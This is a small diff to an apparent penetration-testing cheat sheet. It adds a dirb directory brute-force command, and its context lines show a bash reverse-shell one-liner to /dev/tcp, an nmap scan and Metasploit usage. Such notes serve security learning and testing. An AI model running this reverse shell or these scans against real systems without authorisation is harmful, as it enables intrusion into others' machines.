@@ -46,6 +46,11 @@ bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
 nmap -sC -A -T4 <ip>
 ```
 
+### dirb
+```shell
+dirb <url> /usr/share/wordlists/dirb/common.txt
+```
+
 ### Metasploit basic usage
 ```shell
 msfconsole
